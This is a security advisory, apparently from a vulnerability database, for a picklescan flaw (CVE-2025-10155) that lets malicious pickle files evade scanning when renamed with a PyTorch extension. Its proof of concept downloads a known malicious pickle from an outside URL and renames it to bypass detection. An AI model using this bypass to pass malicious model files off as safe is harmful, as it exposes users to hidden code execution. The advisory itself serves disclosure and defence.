{"hash":"b49894a2f3b9f12d9f7670a114bf652c88d60c61","data":{"post":{"title":"PickleScan Bypass via File Extension Mismatch","path":"/vulnerabilities/picklescan-cve-2025-10155/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>An Improper Input Validation vulnerability in the scanning logic of mmaitre314 picklescan versions up to and including 0.0.30 allows a remote attacker to bypass pickle files security checks by supplying a standard pickle file with a PyTorch-related file extension. When the pickle file incorrectly considered safe is loaded, it can lead to the execution of malicious code.</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://pypi.org/project/picklescan/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">picklescan</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>( , 0.0.31)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The vulnerability exists in the <code>scan_bytes</code> function, which prioritizes file extension checks. If a file has a PyTorch-related extension (e.g., <code>.bin</code>), the scanner attempts to parse it using the <code>scan_pytorch</code> function. When a standard pickle file is given such an extension, this PyTorch-specific parsing fails. Crucially, the scanner then returns an error without falling back to a standard pickle analysis (<code>scan_pickle_bytes</code>). This logic gap allows a malicious standard pickle file, disguised with a mismatched extension, to evade detection.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>The following steps demonstrate how to bypass the scanner.</p>\n<pre><code class=\"language-bash\"># 1. Download a known malicious pickle file.\nwget https://huggingface.co/kzanki/regular_model/resolve/main/model.pkl?download=true -O model.pkl\n\n# 2. Scan the original file. PickleScan correctly detects the threat.\n# Output will contain: dangerous import 'builtins exec' FOUND\npicklescan -p model.pkl\n\n# 3. Rename the file with a PyTorch-related extension.\ncp model.pkl model.bin\n\n# 4. Scan the renamed file.\n# The scan will fail with a PyTorch parsing error and NOT detect the malicious payload.\npicklescan -p model.bin\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/advisories/GHSA-jgw4-cr84-mqxg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GHSA</a>\n<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-10155\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"PickleScan Bypass via File Extension Mismatch allows for evasion of malicious file detection.","date_published":"2025-09-21","xray_id":"XRAY-720936","vul_id":"CVE-2025-10155","severity":"critical","discovered_by":"David Cohen","last_updated":"2025-09-21","cvss":9.3}},"context":{}}